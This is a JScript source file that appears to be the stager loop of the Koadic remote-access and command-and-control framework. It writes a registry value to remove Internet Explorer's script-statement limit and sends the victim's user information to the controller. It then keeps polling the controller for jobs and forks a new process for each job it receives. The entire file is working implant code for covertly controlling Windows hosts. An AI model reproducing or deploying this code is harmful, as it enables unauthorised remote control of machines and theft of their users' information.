try
{
    if (Koadic.JOBKEY != "stage")
    {
        if (Koadic.isHTA())
        {
            //HKCU\SOFTWARE\Microsoft\Internet Explorer\Style\MaxScriptStatements = 0xFFFFFFFF
            var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles";
            var key = "MaxScriptStatements";
            Koadic.registry.write(Koadic.registry.HKCU, path, key, 0xFFFFFFFF, Koadic.registry.DWORD);
        }

        Koadic.work.report(Koadic.user.info());

        Koadic.work.fork("");
        Koadic.exit();
    }
    else
    {
        if (Koadic.isHTA())
            DoWorkTimeout();
        else
            DoWorkLoop();
    }
}
catch (e)
{
    // todo: critical error reporting
}

function DoWork()
{
    try
    {
        var work = Koadic.work.get();

        // 201 = x64 or x86
        // 202 = force x86
        if (work.status == 201 || work.status == 202)
        {
            var jobkey = work.responseText;
            Koadic.work.fork(jobkey, work.status == 202);
        }
        else // if (work.status == 500) // kill code
        {
            return false;
        }
    }
    catch (e)
    {
        return false;
    }

    return true;
}

function DoWorkLoop()
{
    while (DoWork())
        ;

    Koadic.exit();
}

function DoWorkTimeout()
{
    for (var i = 0; i < 10; ++i)
    {
      if (!DoWork())
      {
          Koadic.exit();
          return;
      }
    }
    //window.setTimeout(DoWorkTimeoutCallback, 0);

    Koadic.work.fork("");
    Koadic.exit();
}
